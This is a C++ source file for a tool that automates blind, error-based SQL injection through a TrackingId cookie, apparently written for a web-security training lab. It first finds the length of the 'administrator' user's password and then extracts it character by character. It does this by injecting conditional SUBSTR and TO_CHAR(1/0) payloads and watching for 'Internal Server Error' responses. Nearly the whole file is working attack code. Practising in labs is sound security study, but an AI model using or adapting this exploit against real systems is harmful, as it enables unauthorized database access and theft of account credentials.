#include "SQLBruteForce.hpp"

SQLBruteForce::SQLBruteForce()
{
	session = NULL;
	url = NULL;;
}

SQLBruteForce::~SQLBruteForce()
{
	
	if (url)
	{
		Free(url);
		url=NULL;
	}
	if (session)
	{
		Free(session);
		session=NULL;
	}
}

void SQLBruteForce::setSession(s32* cookieSession)
{
	session = S32(cookieSession);
}


void SQLBruteForce::start()
{
	s32 password[1028] = {};
	i32 position = 1;
	char letter = '0';
	bool found = false;
	int passwordLength = 0;
	i32 passwordCount = 0;

	passwordLength = GetPasswordLength();

	DebugLog("[i] The password length is %i\n", passwordLength);

	while (passwordCount <= passwordLength)
	{
		//"TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

		passwordCount++;

		letter = '0';
		for (;letter != 0x3A;letter++)
		{
			if (CheckLetter(passwordCount, letter))
			{
				printf("%c", letter);
				found = true;
				break;
			}
		}

		if (found == false)
		{
			letter = '@';
			for (;letter != 0x7b;letter++)
			{
				if (CheckLetter(passwordCount, letter))
				{
					printf("%c", letter);
					break;
				}
			}
		}

		found = false;
	}
	printf("\n");
}


i32 SQLBruteForce::GetPasswordLength()
{
	i32 len = 0;

	while(!CheckPasswordLength(len))
	{
		len++;
	}

	return len;
}

bool SQLBruteForce::CheckPasswordLength(int number)
{
	CURLED *curl = NULL;
	s32 *cookie = NULL;
	s32 *results = NULL;
	s32 *payload = NULL;
	s32 *postionInStr = NULL;
	bool foundLength=false;

	postionInStr = IToS(number);

	curl = new CURLED();

	payload = CS32Cat(3,"xyz'||(SELECT CASE WHEN LENGTH(password) = ",postionInStr," THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'");

	cookie = CreateCookie(payload);
	curl->AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
	curl->AddHeader("Cookie", cookie);

	results = curl->Get(url);

	if (results)
	{
		if (HasAnInternalError(results))
		{
			foundLength = true;
		}

		Free(results);
		results=NULL;
	}

	if (payload)
	{
		Free(payload);
		payload = NULL;
	}

	if (cookie)
	{
		Free(cookie);
		cookie=NULL;
	}

	if (postionInStr)
	{
		Free(postionInStr);
		postionInStr = NULL;
	}


	delete curl;
	curl = NULL;

	return foundLength;
}


bool SQLBruteForce::CheckLetter(int position, char letter)
{
	CURLED *curl = NULL;
	s32 *cookie = NULL;
	s32 *results = NULL;
	s32 *payload = NULL;
	s32 *postionInStr = NULL;
	s32 letterString[4] = {};
	bool letterFound = false;

	postionInStr = IToS(position);

	curl = new CURLED();

	letterString[0] = letter;
	payload = CS32Cat(5,"xyz'||(SELECT CASE WHEN SUBSTR(password,", postionInStr,",1)='",letterString,"' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'");

	cookie = CreateCookie(payload);
	curl->AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
	curl->AddHeader("Cookie", cookie);

	results = curl->Get(url);

	if (results)
	{
		if (HasAnInternalError(results))
		{
			letterFound = true;
		}

		Free(results);
		results=NULL;
	}

	if (payload)
	{
		Free(payload);
		payload = NULL;
	}

	if (cookie)
	{
		Free(cookie);
		cookie=NULL;
	}

	if (postionInStr)
	{
		Free(postionInStr);
		postionInStr = NULL;
	}


	delete curl;
	curl = NULL;

	return letterFound;
}

s32 *SQLBruteForce::CreateCookie(char *injectionPayload)
{
	s32 *result = NULL;

	result = CS32Cat(5,"TrackingId=",injectionPayload,"; session=", session, "; Secure; HttpOnly; SameSite=None");

	return result;
}

void SQLBruteForce::setURL(s32 *urlToBrute)
{
	url = S32(urlToBrute);
}

bool SQLBruteForce::HasAnInternalError(s32 *html)
{
	Html_Parser *htmlParser = NULL;
	html_element_result parsedHtml = {};
	bool internalError = false; 

	htmlParser = new Html_Parser();
	parsedHtml = htmlParser->FindElementBy(CLASS,"maincontainer", html);

	if (parsedHtml.isFound)
	{
		s32 *mainContainer= NULL;

		mainContainer= MidString(html, parsedHtml.start,parsedHtml.end);

		if (mainContainer)
		{
			s32 *container = NULL;

			delete parsedHtml.parameters;
			parsedHtml.parameters = NULL;

			delete htmlParser;
			htmlParser = NULL;

			htmlParser = new Html_Parser();
			parsedHtml = htmlParser->FindElementBy(CLASS,"container",mainContainer);

			if (parsedHtml.isFound)
			{
				container= MidString(mainContainer, parsedHtml.start,parsedHtml.end);

				delete parsedHtml.parameters;
				parsedHtml.parameters = NULL;

				delete htmlParser;
				htmlParser = NULL;

				htmlParser = new Html_Parser();

				parsedHtml = htmlParser->FindElementBy(TAG,"h",container);

				if (parsedHtml.isFound)
				{
					s32 *errorMessage = NULL;

					errorMessage = MidString(container, parsedHtml.start,parsedHtml.end-1);

					if (errorMessage)
					{
						if (StrCmp("Internal Server Error",errorMessage))
						{
							internalError = true;
						}
						Free(errorMessage);
						errorMessage=NULL;
					}
					
					Free(container);
					container=NULL;
				}
			}
		}

		Free(mainContainer);
		mainContainer = NULL;
	}

	delete parsedHtml.parameters;
	parsedHtml.parameters = NULL;

	delete htmlParser;
	htmlParser = NULL;

	return internalError;
}
